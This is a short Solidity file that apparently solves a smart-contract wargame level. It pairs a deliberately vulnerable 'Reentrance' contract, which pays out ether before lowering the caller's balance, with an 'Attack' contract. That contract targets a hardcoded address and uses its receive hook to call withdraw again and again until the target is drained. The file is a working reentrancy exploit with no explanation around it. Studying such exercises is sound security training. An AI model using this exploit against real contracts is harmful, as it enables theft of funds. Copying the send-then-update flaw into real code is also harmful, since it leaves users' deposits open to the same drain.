// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attack {
    Reentrance level10 = Reentrance(0xC5946D32A555626921bd3f576E7c57FEAEa2Be6d);

    constructor() public payable {}

    function withdraw() private {
        level10.withdraw(0.002 ether);
    }

    function exploit() external {
        level10.donate{value: 0.002 ether}(address(this));
        withdraw();
    }

    receive() external payable {
        withdraw();
    }
}
